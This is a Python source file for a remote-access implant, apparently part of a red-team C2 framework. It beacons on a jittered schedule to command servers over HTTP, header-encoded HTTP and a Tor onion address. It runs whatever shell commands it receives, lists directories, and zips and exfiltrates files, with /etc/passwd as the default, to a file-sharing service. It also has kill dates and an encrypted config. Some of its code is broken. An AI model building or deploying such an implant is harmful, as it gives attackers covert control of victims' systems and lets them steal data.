from ast import expr_context
from genericpath import isdir
from lib2to3.pytree import Base
from pathlib import Path
from pickle import FALSE
import random
from re import T
import subprocess
import os
import uuid
import time
import shutil
import zipfile
import tempfile
import asyncio
import pickle

# os.environ["GRAYMAN_DEBUG"] = "1"
os.environ["GRAYMAN_VERBOSE"] = "1"
# import sys
# sys.path.append("../")

from helpers import delay, verbose, debug, unwrap_dict, wrap_dict, _encrypt, _decrypt
from classes import  C2Response, HTTPHeaderTransport, HTTPTransport, DNSTransport, MozillaPasteExfil, TCPTransport, TORHTTPTransport, TransfershExfil, Transport

# there are 3 types of c2 servers; 
# access flows down from long to interactive
# long-haul
#   - emergency fall-back should other servers be blocked
#   - shorthaul_freqUENCY > 4 hours 
# short-haul
#   - per operation use
#   - hands off operation to interactive
#   - shorthaul_freqUENCY 15 minutes to 2 hours
# interactive servers
#   - 
#   - shell access to machine
#   - shorthaul_freqUENCY < 60 second

IMPLANT_ID = f"{uuid.getnode():x}"

CONFIG_FILE = '.config.data'

START_DATE = 0 # start time for implant since epoch
START_MODE = 'wait'
STOP_DATE = 9999999999999999 # kill date for implant


LONGHAUL_TRANSPORTS = list()
LONGHAUL_FREQUENCY = 10 # time in seconds; should be days or at least many hours
SHORTHAUL_FAILURE_THRESHOLD = 10 # how many shorthaul failures before trying a longhaul server
SHORTHAUL_TRANSPORTS = list()
SHORTHAUL_FREQUENCY = 1 # in seconds; should be some number of minutes
INTERACTIVE_TRANSPORTS = list() 
INTERACTIVE_FREQUENCY = .1 # in seconds; should be seconds

PROXIES = tuple()

def load_config():
    with open(CONFIG_FILE, 'rb') as f:
        raw = f.read()
    unencrypted = _decrypt(raw)
    print(unencrypted)
    cfg = pickle.loads(unencrypted)
    print(cfg)

    IMPLANT_ID = cfg.get('id')
    START_DATE = cfg.get('start_date')
    START_MODE = cfg.get('start_mode')
    STOP_DATE = cfg.get('stop_date')
    LONGHAUL_FREQUENCY = cfg.get('lhf')
    LONGHAUL_TRANSPORTS, = cfg.get('lht')
    SHORTHAUL_FAILURE_THRESHOLD = cfg.get('sft')
    SHORTHAUL_FREQUENCY = cfg.get('shf')
    SHORTHAUL_TRANSPORTS = cfg.get('sht')
    INTERACTIVE_FREQUENCY = cfg.get('inf')
    INTERACTIVE_TRANSPORTS = cfg.get('int')
    PROXIES = cfg.get('proxies')

    pass



def save_config():
    cfg = {
        'id': IMPLANT_ID,
        'start_date': START_DATE,
        'start_mode': START_MODE,
        'stop_date': STOP_DATE,
        'lhf': LONGHAUL_FREQUENCY,
        'lht': LONGHAUL_TRANSPORTS, 
        'sft': SHORTHAUL_FAILURE_THRESHOLD,
        'shf': SHORTHAUL_FREQUENCY,
        'sht': SHORTHAUL_TRANSPORTS,
        'inf': INTERACTIVE_FREQUENCY,
        'int': INTERACTIVE_TRANSPORTS,
        'proxies': PROXIES,

    }

    t = pickle.dumps(cfg)
    # print(t)
    encrypted = _encrypt(t)
    # print(encrypted)
    with open(CONFIG_FILE,'wb') as f:
        f.write(encrypted)

    


def is_start_date():
    """
    modes:
        wait - sleep until the start date
        exit - exit if not after the start date.
    """
    if time.time() < START_DATE:
        if START_MODE == 'wait':
            while time.time() < START_DATE:
                verbose("not in start window: ", START_DATE - time.time())
                time.sleep(.5)
        elif START_MODE == 'exit':
            exit()

def is_stop_date():
    if time.time() >= STOP_DATE:
        # can we unlink ourself? 
        exit()

async def fork_cmd(cmd:str) -> str:
    """This is for running a long running command that would interrupt the phone home cycle"""
    # TODO actual backgrounding/forking is not implemented; 
    
    command_task = subprocess.run(cmd, capture_output=True, shell=True)
    ret = command_task.stdout.decode()

    if ret:
        return ret
    return ""

def compress_file(target_path:Path) -> str:
    """compresses and wraps a file for exfil"""
    target_path = Path(f'{target_path}')
    try:
        if target_path.is_dir():
            output_dir=f'{tempfile.gettempdir()}/exfil'
            shutil.make_archive(output_dir, 'zip', target_path)
            shutil.make_archive()
            return f'{output_dir}.zip'
        else:
            zipfile.ZipFile(f'{target_path.name}.zip', mode='w').write(f"{target_path.absolute()}")
    except BaseException as e:
        print(e)
    return f'{target_path}'

def add_transport(t_obj:dict):
    t_type = t_obj.get('type')
    t_server = t_obj.get('server')
    t_role = t_obj.get('role') # long or short
    if t_type == "HTTP":
        t = HTTPTransport(server=t_server)
    elif t_type == "HTTPHeader":
        t = HTTPHeaderTransport(server=t_server)
    if t_role == "long":
        LONGHAUL_TRANSPORTS.append(t)
    elif t_role == 'short':
        SHORTHAUL_TRANSPORTS.append(t)
    save_config()

def del_transport(t_obj:dict):
    t_type = t_obj.get('type')
    t_server = t_obj.get('server')
    t_role = t_obj.get('role') # long or short
    #iterate through appropriate role list
    #if t_server == transport.server
    if t_role == 'short':
        t = None
        for s in SHORTHAUL_TRANSPORTS:
            if s.server == t_server:
                t = s
                break
        SHORTHAUL_TRANSPORTS.remove(t)



async def operate():
    is_start_date()
    verbose("Operating...")

    global LONGHAUL_FREQUENCY
    global LONGHAUL_TRANSPORTS
    global SHORTHAUL_FREQUENCY
    global SHORTHAUL_TRANSPORTS
    
    t1 = HTTPTransport(server="http://localhost:3000/ep1", proxies=PROXIES)
    t2 = HTTPTransport(server="http://localhost:3000/ep2", proxies=PROXIES)
    t3 = HTTPTransport(server="http://localhost:3000/ep3", proxies=PROXIES)
    t4 = HTTPHeaderTransport(server='http://localhost:3000/headers')
    t5 = HTTPHeaderTransport(server='http://localhost:3000/favicon.ico')
    tor = TORHTTPTransport(server="http://kd2jprsfzfneplnhhaszw4dkfd7nbecg2w56u5kmyusnxcl6tg3qjcyd.onion/tor")
    # t4 = DNSTransport(domain="c2.shyft.us")
    # t5 = TCPTransport(server="localhost:9999")
    # TRANSPORTS = [t1, t2, t3, t4]
    
    lh = HTTPTransport(server="http://localhost:5000/longhaul", proxies=PROXIES)
    
    LONGHAUL_TRANSPORTS = [lh]
    SHORTHAUL_TRANSPORTS = [t1, t2, t3, t4, t5]
    # SHORTHAUL_TRANSPORTS = [tor]
    # SHORTHAUL_TRANSPORTS = [t4, t5]
    
    PHONEHOME_SUCCESS = False
    
    SHORTHAUL_FAILURE_COUNT = 0
    
    while True:
        is_stop_date()

        c2_resp = C2Response()
        c2_resp.implant_id = IMPLANT_ID
        # Get command
        cmd_output = ""
        try:
            # pick a random transport every time... 
            if SHORTHAUL_FAILURE_COUNT > SHORTHAUL_FAILURE_THRESHOLD:
                transport = random.choice(LONGHAUL_TRANSPORTS)
            else:
                transport = random.choice(SHORTHAUL_TRANSPORTS)
            c2_cmd = transport.recv()

            shell_cmd = c2_cmd.get('shell_cmd')
            if shell_cmd != None: # if there is a command... do this... 
                cmd_output = await fork_cmd(shell_cmd)
                c2_resp.payload = cmd_output

            if c2_cmd.get('add_transport'):
                t_obj = c2_cmd.get('add_transport')
                add_transport(t_obj)


            if c2_cmd.get('del_transport'):
                t_obj = c2_cmd.get('del_transport')
                del_transport(t_obj)

            if c2_cmd.get('exfil'):
                t_obj = c2_cmd.get('exfil',{})
                t_path = t_obj.get('target_path', '/etc/passwd')
        
                prepped_file = compress_file(Path(t_path))
                ex = TransfershExfil()
                exfil_pickup = ex.send(prepped_file)
                verbose(exfil_pickup)

            if c2_cmd.get('ls'):
                t_obj = c2_cmd.get('ls',{})
                t_path = t_obj.get('target_path', '/')
                c2_resp.payload += await fork_cmd(f"ls -la {t_path}")


            new_sh_freq = c2_cmd.get('shorthaul_freq')
            if new_sh_freq != None:
                SHORTHAUL_FREQUENCY = new_sh_freq
                verbose(f"New shorthaul callback frequency: {SHORTHAUL_FREQUENCY}")

            new_lh_freq = c2_cmd.get('longhaul_freq')
            if new_lh_freq != None:
                LONGHAUL_FREQUENCY = new_lh_freq
                verbose(f"New longhaul callback frequency: {LONGHAUL_FREQUENCY}")


            # if we get this far phone home was successful
            PHONEHOME_SUCCESS = True
            NEXT_LH_PHONEHOME = int(time.time()) + LONGHAUL_FREQUENCY
        except BaseException as e: 
            SHORTHAUL_FAILURE_COUNT += 1 
            PHONEHOME_SUCCESS = False          
            verbose(e)
            

        # upodate the callback frequency if requested. 
        

        # wait some time
        jitter = SHORTHAUL_FREQUENCY // 4
        delay(SHORTHAUL_FREQUENCY, jitter_amount=jitter)

        # send results back
        try:
            if cmd_output != None:
                transport = random.choice(SHORTHAUL_TRANSPORTS)
                transport_resp = transport.send(cmd_output, implant_id=IMPLANT_ID, jobid=c2_cmd.get('jobid', ''))
                # maybe we do some thing with the response, maybe we don't...
                
        except BaseException as e:
            SHORTHAUL_FAILURE_COUNT += 1 
            PHONEHOME_SUCCESS = False
            debug(e)

        

        SHORTHAUL_FAILURE_COUNT = 0 
        # wait some more time
        jitter = SHORTHAUL_FREQUENCY // 4
        delay(SHORTHAUL_FREQUENCY, jitter_amount=jitter)

        save_config()


if __name__ == "__main__":
    try:
        load_config()
    except FileNotFoundError:
        save_config()
    try:
        asyncio.run(operate())
    except KeyboardInterrupt as e:
        print("\nShutting down...", e)
